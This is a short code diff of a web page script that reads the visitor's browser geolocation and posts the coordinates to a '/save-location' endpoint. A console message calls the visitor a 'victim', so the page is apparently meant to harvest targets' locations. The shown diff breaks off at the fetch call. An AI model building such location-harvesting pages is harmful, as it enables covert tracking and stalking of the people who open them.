@@ -11,16 +11,20 @@
 <script>
   function getLocation() {
     if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(sendLocation);
+      navigator.geolocation.getCurrentPosition(showPosition);
     } else {
-      alert("Geolocation is not supported by this browser.");
+      console.log("Geolocation is not supported by victim's browser.");
     }
   }
 
-  function sendLocation(position) {
+  function showPosition(position) {
+
+    const latitude = position.coords.latitude;
+    const longitude = position.coords.longitude;
+  
     const data = {
-      latitude: position.coords.latitude,
-      longitude: position.coords.longitude,
+      latitude: latitude,
+      longitude: longitude,
     };
 
     fetch("/save-location", {
